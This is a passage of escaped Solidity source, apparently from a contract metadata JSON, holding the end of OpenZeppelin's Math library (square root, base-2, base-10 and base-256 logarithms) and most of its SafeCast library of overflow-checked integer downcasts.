       uint256 xn = 1;\\n\\n            if (aa >= (1 << 128)) {\\n                aa >>= 128;\\n                xn <<= 64;\\n            }\\n            if (aa >= (1 << 64)) {\\n                aa >>= 64;\\n                xn <<= 32;\\n            }\\n            if (aa >= (1 << 32)) {\\n                aa >>= 32;\\n                xn <<= 16;\\n            }\\n            if (aa >= (1 << 16)) {\\n                aa >>= 16;\\n                xn <<= 8;\\n            }\\n            if (aa >= (1 << 8)) {\\n                aa >>= 8;\\n                xn <<= 4;\\n            }\\n            if (aa >= (1 << 4)) {\\n                aa >>= 4;\\n                xn <<= 2;\\n            }\\n            if (aa >= (1 << 2)) {\\n                xn <<= 1;\\n            }\\n\\n            // We now have x_n such that `x_n = 2**(e-1) \\u2264 sqrt(a) < 2**e = 2 * x_n`. This implies \\u03b5_n \\u2264 2**(e-1).\\n            //\\n            // We can refine our estimation by noticing that the middle of that interval minimizes the error.\\n            // If we move x_n to equal 2**(e-1) + 2**(e-2), then we reduce the error to \\u03b5_n \\u2264 2**(e-2).\\n            // This is going to be our x_0 (and \\u03b5_0)\\n            xn = (3 * xn) >> 1; // \\u03b5_0 := | x_0 - sqrt(a) | \\u2264 2**(e-2)\\n\\n            // From here, Newton's method give us:\\n            // x_{n+1} = (x_n + a / x_n) / 2\\n            //\\n            // One should note that:\\n            // x_{n+1}\\u00b2 - a = ((x_n + a / x_n) / 2)\\u00b2 - a\\n            //              = ((x_n\\u00b2 + a) / (2 * x_n))\\u00b2 - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2) - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2 - 4 * a * x_n\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u2074 - 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u00b2 - a)\\u00b2 / (2 * x_n)\\u00b2\\n            //              = ((x_n\\u00b2 - a) / (2 * x_n))\\u00b2\\n            //              \\u2265 0\\n            // Which proves that for all n \\u2265 1, sqrt(a) \\u2264 x_n\\n            //\\n            // This gives us the proof of quadratic convergence of the sequence:\\n            // \\u03b5_{n+1} = | x_{n+1} - sqrt(a) |\\n            //         = | (x_n + a / x_n) / 2 - sqrt(a) |\\n            //         = | (x_n\\u00b2 + a - 2*x_n*sqrt(a)) / (2 * x_n) |\\n            //         = | (x_n - sqrt(a))\\u00b2 / (2 * x_n) |\\n            //         = | \\u03b5_n\\u00b2 / (2 * x_n) |\\n            //         = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //\\n            // For the first iteration, we have a special case where x_0 is known:\\n            // \\u03b5_1 = \\u03b5_0\\u00b2 / | (2 * x_0) |\\n            //     \\u2264 (2**(e-2))\\u00b2 / (2 * (2**(e-1) + 2**(e-2)))\\n            //     \\u2264 2**(2*e-4) / (3 * 2**(e-1))\\n            //     \\u2264 2**(e-3) / 3\\n            //     \\u2264 2**(e-3-log2(3))\\n            //     \\u2264 2**(e-4.5)\\n            //\\n            // For the following iterations, we use the fact that, 2**(e-1) \\u2264 sqrt(a) \\u2264 x_n:\\n            // \\u03b5_{n+1} = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //         \\u2264 (2**(e-k))\\u00b2 / (2 * 2**(e-1))\\n            //         \\u2264 2**(2*e-2*k) / 2**e\\n            //         \\u2264 2**(e-2*k)\\n            xn = (xn + a / xn) >> 1; // \\u03b5_1 := | x_1 - sqrt(a) | \\u2264 2**(e-4.5)  -- special case, see above\\n            xn = (xn + a / xn) >> 1; // \\u03b5_2 := | x_2 - sqrt(a) | \\u2264 2**(e-9)    -- general case with k = 4.5\\n            xn = (xn + a / xn) >> 1; // \\u03b5_3 := | x_3 - sqrt(a) | \\u2264 2**(e-18)   -- general case with k = 9\\n            xn = (xn + a / xn) >> 1; // \\u03b5_4 := | x_4 - sqrt(a) | \\u2264 2**(e-36)   -- general case with k = 18\\n            xn = (xn + a / xn) >> 1; // \\u03b5_5 := | x_5 - sqrt(a) | \\u2264 2**(e-72)   -- general case with k = 36\\n            xn = (xn + a / xn) >> 1; // \\u03b5_6 := | x_6 - sqrt(a) | \\u2264 2**(e-144)  -- general case with k = 72\\n\\n            // Because e \\u2264 128 (as discussed during the first estimation phase), we know have reached a precision\\n            // \\u03b5_6 \\u2264 2**(e-144) < 1. Given we're operating on integers, then we can ensure that xn is now either\\n            // sqrt(a) or sqrt(a) + 1.\\n            return xn - SafeCast.toUint(xn > a / xn);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && result * result < a);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // If upper 8 bits of 16-bit half set, add 8 to result\\n        r |= SafeCast.toUint((x >> r) > 0xff) << 3;\\n        // If upper 4 bits of 8-bit half set, add 4 to result\\n        r |= SafeCast.toUint((x >> r) > 0xf) << 2;\\n\\n        // Shifts value right by the current result and use it as an index into this lookup table:\\n        //\\n        // | x (4 bits) |  index  | table[index] = MSB position |\\n        // |------------|---------|-----------------------------|\\n        // |    0000    |    0    |        table[0] = 0         |\\n        // |    0001    |    1    |        table[1] = 0         |\\n        // |    0010    |    2    |        table[2] = 1         |\\n        // |    0011    |    3    |        table[3] = 1         |\\n        // |    0100    |    4    |        table[4] = 2         |\\n        // |    0101    |    5    |        table[5] = 2         |\\n        // |    0110    |    6    |        table[6] = 2         |\\n        // |    0111    |    7    |        table[7] = 2         |\\n        // |    1000    |    8    |        table[8] = 3         |\\n        // |    1001    |    9    |        table[9] = 3         |\\n        // |    1010    |   10    |        table[10] = 3        |\\n        // |    1011    |   11    |        table[11] = 3        |\\n        // |    1100    |   12    |        table[12] = 3        |\\n        // |    1101    |   13    |        table[13] = 3        |\\n        // |    1110    |   14    |        table[14] = 3        |\\n        // |    1111    |   15    |        table[15] = 3        |\\n        //\\n        // The lookup table is represented as a 32-byte value with the MSB positions for 0-15 in the last 16 bytes.\\n        assembly (\\\"memory-safe\\\") {\\n            r := or(r, byte(shr(r, x), 0x0000010102020202030303030303030300000000000000000000000000000000))\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10 ** 64) {\\n                value /= 10 ** 64;\\n                result += 64;\\n            }\\n            if (value >= 10 ** 32) {\\n                value /= 10 ** 32;\\n                result += 32;\\n            }\\n            if (value >= 10 ** 16) {\\n                value /= 10 ** 16;\\n                result += 16;\\n            }\\n            if (value >= 10 ** 8) {\\n                value /= 10 ** 8;\\n                result += 8;\\n            }\\n            if (value >= 10 ** 4) {\\n                value /= 10 ** 4;\\n                result += 4;\\n            }\\n            if (value >= 10 ** 2) {\\n                value /= 10 ** 2;\\n                result += 2;\\n            }\\n            if (value >= 10 ** 1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 10 ** result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // Add 1 if upper 8 bits of 16-bit half set, and divide accumulated result by 8\\n        return (r >> 3) | SafeCast.toUint((x >> r) > 0xff);\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << (result << 3) < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\\n     */\\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\\n        return uint8(rounding) % 2 == 1;\\n    }\\n}\\n\",\"keccak256\":\"0x1225214420c83ebcca88f2ae2b50f053aaa7df7bd684c3e878d334627f2edfc6\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SafeCast.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)\\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\\n * checks.\\n *\\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\\n * easily result in undesired exploitation or bugs, since developers usually\\n * assume that overflows raise errors. `SafeCast` restores this intuition by\\n * reverting the transaction when such an operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it's recommended to use it always.\\n */\\nlibrary SafeCast {\\n    /**\\n     * @dev Value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);\\n\\n    /**\\n     * @dev An int value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedIntToUint(int256 value);\\n\\n    /**\\n     * @dev Value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);\\n\\n    /**\\n     * @dev An uint value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedUintToInt(uint256 value);\\n\\n    /**\\n     * @dev Returns the downcasted uint248 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint248).\\n     *\\n     * Counterpart to Solidity's `uint248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toUint248(uint256 value) internal pure returns (uint248) {\\n        if (value > type(uint248).max) {\\n            revert SafeCastOverflowedUintDowncast(248, value);\\n        }\\n        return uint248(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint240 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint240).\\n     *\\n     * Counterpart to Solidity's `uint240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toUint240(uint256 value) internal pure returns (uint240) {\\n        if (value > type(uint240).max) {\\n            revert SafeCastOverflowedUintDowncast(240, value);\\n        }\\n        return uint240(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint232 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint232).\\n     *\\n     * Counterpart to Solidity's `uint232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toUint232(uint256 value) internal pure returns (uint232) {\\n        if (value > type(uint232).max) {\\n            revert SafeCastOverflowedUintDowncast(232, value);\\n        }\\n        return uint232(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint224 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint224).\\n     *\\n     * Counterpart to Solidity's `uint224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toUint224(uint256 value) internal pure returns (uint224) {\\n        if (value > type(uint224).max) {\\n            revert SafeCastOverflowedUintDowncast(224, value);\\n        }\\n        return uint224(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint216 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint216).\\n     *\\n     * Counterpart to Solidity's `uint216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toUint216(uint256 value) internal pure returns (uint216) {\\n        if (value > type(uint216).max) {\\n            revert SafeCastOverflowedUintDowncast(216, value);\\n        }\\n        return uint216(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint208 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint208).\\n     *\\n     * Counterpart to Solidity's `uint208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toUint208(uint256 value) internal pure returns (uint208) {\\n        if (value > type(uint208).max) {\\n            revert SafeCastOverflowedUintDowncast(208, value);\\n        }\\n        return uint208(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint200 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint200).\\n     *\\n     * Counterpart to Solidity's `uint200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toUint200(uint256 value) internal pure returns (uint200) {\\n        if (value > type(uint200).max) {\\n            revert SafeCastOverflowedUintDowncast(200, value);\\n        }\\n        return uint200(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint192 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint192).\\n     *\\n     * Counterpart to Solidity's `uint192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toUint192(uint256 value) internal pure returns (uint192) {\\n        if (value > type(uint192).max) {\\n            revert SafeCastOverflowedUintDowncast(192, value);\\n        }\\n        return uint192(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint184 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint184).\\n     *\\n     * Counterpart to Solidity's `uint184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toUint184(uint256 value) internal pure returns (uint184) {\\n        if (value > type(uint184).max) {\\n            revert SafeCastOverflowedUintDowncast(184, value);\\n        }\\n        return uint184(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint176 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint176).\\n     *\\n     * Counterpart to Solidity's `uint176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toUint176(uint256 value) internal pure returns (uint176) {\\n        if (value > type(uint176).max) {\\n            revert SafeCastOverflowedUintDowncast(176, value);\\n        }\\n        return uint176(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint168 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint168).\\n     *\\n     * Counterpart to Solidity's `uint168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toUint168(uint256 value) internal pure returns (uint168) {\\n        if (value > type(uint168).max) {\\n            revert SafeCastOverflowedUintDowncast(168, value);\\n        }\\n        return uint168(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint160 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint160).\\n     *\\n     * Counterpart to Solidity's `uint160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toUint160(uint256 value) internal pure returns (uint160) {\\n        if (value > type(uint160).max) {\\n            revert SafeCastOverflowedUintDowncast(160, value);\\n        }\\n        return uint160(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint152 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint152).\\n     *\\n     * Counterpart to Solidity's `uint152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toUint152(uint256 value) internal pure returns (uint152) {\\n        if (value > type(uint152).max) {\\n            revert SafeCastOverflowedUintDowncast(152, value);\\n        }\\n        return uint152(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint144 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint144).\\n     *\\n     * Counterpart to Solidity's `uint144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toUint144(uint256 value) internal pure returns (uint144) {\\n        if (value > type(uint144).max) {\\n            revert SafeCastOverflowedUintDowncast(144, value);\\n        }\\n        return uint144(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint136 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint136).\\n     *\\n     * Counterpart to Solidity's `uint136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toUint136(uint256 value) internal pure returns (uint136) {\\n        if (value > type(uint136).max) {\\n            revert SafeCastOverflowedUintDowncast(136, value);\\n        }\\n        return uint136(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint128 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint128).\\n     *\\n     * Counterpart to Solidity's `uint128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toUint128(uint256 value) internal pure returns (uint128) {\\n        if (value > type(uint128).max) {\\n            revert SafeCastOverflowedUintDowncast(128, value);\\n        }\\n        return uint128(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint120 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint120).\\n     *\\n     * Counterpart to Solidity's `uint120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toUint120(uint256 value) internal pure returns (uint120) {\\n        if (value > type(uint120).max) {\\n            revert SafeCastOverflowedUintDowncast(120, value);\\n        }\\n        return uint120(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint112 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint112).\\n     *\\n     * Counterpart to Solidity's `uint112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toUint112(uint256 value) internal pure returns (uint112) {\\n        if (value > type(uint112).max) {\\n            revert SafeCastOverflowedUintDowncast(112, value);\\n        }\\n        return uint112(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint104 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint104).\\n     *\\n     * Counterpart to Solidity's `uint104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toUint104(uint256 value) internal pure returns (uint104) {\\n        if (value > type(uint104).max) {\\n            revert SafeCastOverflowedUintDowncast(104, value);\\n        }\\n        return uint104(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint96 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint96).\\n     *\\n     * Counterpart to Solidity's `uint96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toUint96(uint256 value) internal pure returns (uint96) {\\n        if (value > type(uint96).max) {\\n            revert SafeCastOverflowedUintDowncast(96, value);\\n        }\\n        return uint96(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint88 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint88).\\n     *\\n     * Counterpart to Solidity's `uint88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toUint88(uint256 value) internal pure returns (uint88) {\\n        if (value > type(uint88).max) {\\n            revert SafeCastOverflowedUintDowncast(88, value);\\n        }\\n        return uint88(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint80 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint80).\\n     *\\n     * Counterpart to Solidity's `uint80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toUint80(uint256 value) internal pure returns (uint80) {\\n        if (value > type(uint80).max) {\\n            revert SafeCastOverflowedUintDowncast(80, value);\\n        }\\n        return uint80(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint72 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint72).\\n     *\\n     * Counterpart to Solidity's `uint72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toUint72(uint256 value) internal pure returns (uint72) {\\n        if (value > type(uint72).max) {\\n            revert SafeCastOverflowedUintDowncast(72, value);\\n        }\\n        return uint72(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint64 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint64).\\n     *\\n     * Counterpart to Solidity's `uint64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toUint64(uint256 value) internal pure returns (uint64) {\\n        if (value > type(uint64).max) {\\n            revert SafeCastOverflowedUintDowncast(64, value);\\n        }\\n        return uint64(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint56 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint56).\\n     *\\n     * Counterpart to Solidity's `uint56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toUint56(uint256 value) internal pure returns (uint56) {\\n        if (value > type(uint56).max) {\\n            revert SafeCastOverflowedUintDowncast(56, value);\\n        }\\n        return uint56(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint48 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint48).\\n     *\\n     * Counterpart to Solidity's `uint48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toUint48(uint256 value) internal pure returns (uint48) {\\n        if (value > type(uint48).max) {\\n            revert SafeCastOverflowedUintDowncast(48, value);\\n        }\\n        return uint48(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint40 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint40).\\n     *\\n     * Counterpart to Solidity's `uint40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toUint40(uint256 value) internal pure returns (uint40) {\\n        if (value > type(uint40).max) {\\n            revert SafeCastOverflowedUintDowncast(40, value);\\n        }\\n        return uint40(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint32 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint32).\\n     *\\n     * Counterpart to Solidity's `uint32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toUint32(uint256 value) internal pure returns (uint32) {\\n        if (value > type(uint32).max) {\\n            revert SafeCastOverflowedUintDowncast(32, value);\\n        }\\n        return uint32(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint24 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint24).\\n     *\\n     * Counterpart to Solidity's `uint24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toUint24(uint256 value) internal pure returns (uint24) {\\n        if (value > type(uint24).max) {\\n            revert SafeCastOverflowedUintDowncast(24, value);\\n        }\\n        return uint24(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint16 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint16).\\n     *\\n     * Counterpart to Solidity's `uint16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toUint16(uint256 value) internal pure returns (uint16) {\\n        if (value > type(uint16).max) {\\n            revert SafeCastOverflowedUintDowncast(16, value);\\n        }\\n        return uint16(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint8 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint8).\\n     *\\n     * Counterpart to Solidity's `uint8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toUint8(uint256 value) internal pure returns (uint8) {\\n        if (value > type(uint8).max) {\\n            revert SafeCastOverflowedUintDowncast(8, value);\\n        }\\n        return uint8(value);\\n    }\\n\\n    /**\\n     * @dev Converts a signed int256 into an unsigned uint256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be greater than or equal to 0.\\n     */\\n    function toUint256(int256 value) internal pure returns (uint256) {\\n        if (value < 0) {\\n            revert SafeCastOverflowedIntToUint(value);\\n        }\\n        return uint256(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int248 from int256, reverting on\\n     * overflow (when the input is less than smallest int248 or\\n     * greater than largest int248).\\n     *\\n     * Counterpart to Solidity's `int248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\\n        downcasted = int248(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(248, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int240 from int256, reverting on\\n     * overflow (when the input is less than smallest int240 or\\n     * greater than largest int240).\\n     *\\n     * Counterpart to Solidity's `int240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\\n        downcasted = int240(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(240, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int232 from int256, reverting on\\n     * overflow (when the input is less than smallest int232 or\\n     * greater than largest int232).\\n     *\\n     * Counterpart to Solidity's `int232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\\n        downcasted = int232(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(232, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int224 from int256, reverting on\\n     * overflow (when the input is less than smallest int224 or\\n     * greater than largest int224).\\n     *\\n     * Counterpart to Solidity's `int224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\\n        downcasted = int224(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(224, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int216 from int256, reverting on\\n     * overflow (when the input is less than smallest int216 or\\n     * greater than largest int216).\\n     *\\n     * Counterpart to Solidity's `int216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\\n        downcasted = int216(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(216, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int208 from int256, reverting on\\n     * overflow (when the input is less than smallest int208 or\\n     * greater than largest int208).\\n     *\\n     * Counterpart to Solidity's `int208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\\n        downcasted = int208(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(208, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int200 from int256, reverting on\\n     * overflow (when the input is less than smallest int200 or\\n     * greater than largest int200).\\n     *\\n     * Counterpart to Solidity's `int200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\\n        downcasted = int200(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(200, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int192 from int256, reverting on\\n     * overflow (when the input is less than smallest int192 or\\n     * greater than largest int192).\\n     *\\n     * Counterpart to Solidity's `int192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\\n        downcasted = int192(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(192, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int184 from int256, reverting on\\n     * overflow (when the input is less than smallest int184 or\\n     * greater than largest int184).\\n     *\\n     * Counterpart to Solidity's `int184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\\n        downcasted = int184(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(184, 